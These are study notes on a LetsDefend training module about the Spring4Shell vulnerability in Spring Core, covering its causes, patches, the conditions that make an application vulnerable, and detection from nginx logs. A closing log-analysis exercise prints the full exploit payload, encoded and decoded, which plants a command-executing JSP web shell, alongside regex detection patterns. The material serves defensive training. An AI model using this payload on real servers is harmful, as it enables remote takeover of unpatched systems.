# LetsDefend: Spring4Shell Module Summary 

**Table of Contents:** 

- Spring4Shell
    - Overview
    - What Causes the Vulnerability?
    - How Attackers Exploit It
    - Detection & Response
    - Mitigation Strategies
    - Check if Your Application is Vulnerable
    - Remediation
- SOC Analyst Perspective
- Training lab → https://tryhackme.com/room/spring4shell

# **Spring4Shell (CVE-2022-22965)**

### **Overview**

Spring4Shell is a **critical Remote Code Execution (RCE)** vulnerability affecting the **Spring Core** framework. Discovered on **March 29, 2022**, it occurs due to flaws in **Spring’s HTTP request parser**, allowing attackers to craft malicious requests and execute arbitrary commands on the server.

---

## **What Causes the Vulnerability?**

Spring4Shell exists due to:

- Improper handling of **user-supplied input**
- Ability to manipulate **Spring’s data-binding mechanism**
- Ability to write arbitrary files on disk via **ClassLoader access**

Once exploited, attackers may gain:

- Remote code execution
- Unauthorized access
- Complete system compromise

---

## **How Attackers Exploit It**

Attackers target:

- User input fields (forms, query parameters)
- REST API parameters
- Any HTTP request processed by Spring

Techniques include:

- Command separators
- Input validation bypass
- Malicious payloads for remote command execution

---

## **Detection & Response**

### **1. Input Validation**

Use strict validation, whitelisting, and proper sanitization.

### **2. Security Audits**

Review:

- Code that handles input
- Areas executing system commands
- Unsafe APIs

### **3. Logging & Monitoring**

Monitor:

- Abnormal HTTP requests
- Suspicious command execution attempts
- Unexpected file creation/writes

### **4. Intrusion Detection Systems (IDS)**

Enable detection for:

- Command injection attempts
- Anomalous behavior in Spring applications

---

## **Mitigation Strategies**

### **1. Update Spring Framework**

Patch to:

- **Spring 5.3.18+**
- **Spring 5.2.20+**

### **2. Enforce Secure Input Handling**

- Validate expected data types
- Enforce length limits
- Escape and encode input properly

### **3. Secure Configuration**

- Disable unnecessary Spring features
- Review Tomcat configurations
- Remove risky endpoints

### **4. Regular Penetration Testing**

Identify:

- Misconfigurations
- Unpatched versions
- Possible injection points

---

## **Check if Your Application is Vulnerable**

Your app may be vulnerable if ALL are true:

1. Running **JDK 9+**
2. Using **Apache Tomcat** as servlet container
3. Packaged as **traditional WAR** (not Spring Boot JAR)
4. Uses **spring-webmvc** or **spring-webflux**
5. Using Spring versions **5.3.0–5.3.17** or **5.2.0–5.2.19**

If all apply → **High risk of Spring4Shell exposure**.

---

## **Remediation**

### **Upgrade Spring Framework**

- Patch to **5.3.18** or **5.2.20**
- Update using **Maven** or **Gradle** dependency versions

### **If You Cannot Patch**

Use Spring’s **official workaround**, but patching is still the recommended solution.

# **SOC Analyst Perspective**

As a SOC analyst, the goal is to detect **early indicators of exploitation attempts** targeting the Spring4Shell vulnerability. Although Nginx logs do not always capture full request bodies or Java object paths directly, analysts can still rely on behavioral and payload‑level indicators.

---

## **Key Detection Approaches**

### **1. Analyze POST Request Payloads**

Review captured POST request bodies for:

- Suspicious or malformed input
- Payloads attempting **command injection**
- Patterns suggesting remote command execution (e.g., encoded commands, shell operators)

Spring4Shell exploits often involve attempts to trigger a Java property binding chain.

---

### **2. Detect Command Injection Indicators**

Look for:

- Metacharacters (`;`, `|`, `&&`, backticks)
- Encoded versions of these characters
- Java execution keywords such as:
    - **`getRuntime().exec`**
    - **`Runtime.getRuntime()`**

These are strong signals of an attempt to trigger RCE through Spring.

---

### **3. Monitor for Suspicious URLs & Parameters**

Inspect:

- Unusual parameter values
- Encoded payloads
- Unexpected parameters appearing in POST requests
- Known Spring4Shell exploitation paths
    
    (especially those attempting to bind arbitrary fields)
    

Such anomalies often accompany early exploitation attempts.

---

### **4. Detect Abnormal Request Behavior**

Investigate:

- Repeated POST requests to the same endpoint
- Large or unexpectedly complex payloads
- Sudden traffic spikes
- Traffic from suspicious IPs or automation tools

These patterns are consistent with exploitation or scanning activity.

---

## **Critical IOC: `class.module.classLoader.resources`**

Many real-world Spring4Shell payloads include the property chain:

```
class.module.classLoader.resources
```

It appears when attackers try to manipulate class loaders to write malicious files and gain code execution.

While **Nginx logs do not show this by default**, it is still detectable by capturing POST request bodies.

---

## **How to Enhance Visibility in Nginx**

### **1. Enable Request Body Logging**

Modify Nginx configuration to log POST bodies for further inspection. This enables detection of key payload components like:

- `class.module.classLoader.resources`
- `getRuntime().exec`

### **2. Use Regex for Payload Detection (Optional)**

Regex can help find exploitation patterns, e.g.:

```
class\.module\.classLoader\.resources
getRuntime\(\)\.exec
```

Use carefully to avoid false positives.

---

## **Conclusion**

Although Nginx does not natively log fine‑grained Java-level payloads, enabling **request body logging**, analyzing **payload structure**, and monitoring **anomalous behavior** allows SOC analysts to detect early Spring4Shell exploitation attempts. The recurring keyword **`class.module.classLoader.resources`** remains a strong IOC and should be monitored closely.

### Q&A

The access log was configured to log the POST data

```bash
root@ip-172-31-2-218:~/Desktop# grep "class\.module\.classLoader\.resources" access.log 
68.39.225.163 - - [23/Apr/2023:05:32:13 +0000] "POST /spring-form/greeting HTTP/1.1" 200 334 "http://victim.com/" "python-requests/2.25.1" [class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=]
68.39.225.163 - - [23/Apr/2023:05:32:16 +0000] "POST /spring-form/greeting HTTP/1.1" 200 334 "http://victim.com/" "python-requests/2.25.1" [class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_]
68.39.225.163 - - [23/Apr/2023:05:32:16 +0000] "POST /spring-form/greeting HTTP/1.1" 200 334 "http://victim.com/" "python-requests/2.25.1" [class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=]
68.39.225.163 - - [23/Apr/2023:05:32:20 +0000] "POST /spring-form/greeting HTTP/1.1" 200 334 "http://victim.com/" "python-requests/2.25.1" [class.module.classLoader.resources.context.parent.pipeline.first.pattern=]
root@ip-172-31-2-218:~/Desktop# 

```

URL Decode: 

```bash
root@ip-172-31-2-218:~/Desktop# grep "class\.module\.classLoader\.resources" access.log 
68.39.225.163 - - [23/Apr/2023:05:32:13  0000] "POST /spring-form/greeting HTTP/1.1" 200 334 "http://victim.com/" "python-requests/2.25.1" [class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=]
68.39.225.163 - - [23/Apr/2023:05:32:16  0000] "POST /spring-form/greeting HTTP/1.1" 200 334 "http://victim.com/" "python-requests/2.25.1" [class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_]
68.39.225.163 - - [23/Apr/2023:05:32:16  0000] "POST /spring-form/greeting HTTP/1.1" 200 334 "http://victim.com/" "python-requests/2.25.1" [class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=]
68.39.225.163 - - [23/Apr/2023:05:32:20  0000] "POST /spring-form/greeting HTTP/1.1" 200 334 "http://victim.com/" "python-requests/2.25.1" [class.module.classLoader.resources.context.parent.pipeline.first.pattern=]
root@ip-172-31-2-218:~/Desktop# 

```

- The attacker ip → *68.39.225.163*
- The sate of the starting attack → *23/Apr/2023:05:32:13*
- The attacker user-agent → *python-requests/2.25.1*
